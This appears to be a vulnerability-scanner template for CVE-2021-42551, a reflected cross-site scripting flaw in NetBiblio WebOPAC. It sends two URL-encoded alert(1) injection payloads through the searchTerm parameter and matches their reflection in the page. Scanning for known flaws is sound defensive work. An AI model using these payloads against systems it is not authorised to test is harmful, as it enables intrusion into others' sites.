id: CVE-2021-42551
info:
  author: compr00t
  classification:
    cve-id: CVE-2021-42551
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: NetBiblio WebOPAC before 4.0.0.320 is affected by a reflected cross-site
    scripting vulnerability in its Wikipedia module through /NetBiblio/search/shortview
    via the searchTerm parameter.
  name: NetBiblio WebOPAC - Reflected Cross-Site Scripting
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-42551
  - https://www.redguard.ch/advisories/netbiblio_webopac.txt
  severity: medium
  tags: cve,cve2021,xss,netbiblio
requests:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - 'SearchTerm: ''x''+alert(1)+''x'','
    - 'SearchTerm: ''x\\''+alert(1),//'','
  - part: header
    type: word
    words:
    - text/html
  - part: body
    type: word
    words:
    - NetBiblio
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 3
  method: GET
  path:
  - '{{BaseURL}}/NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%27%2Balert%281%29%2B%27x'
  - '{{BaseURL}}/NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%5C%27%2Balert%281%29%2C%2F%2F'
  redirects: true
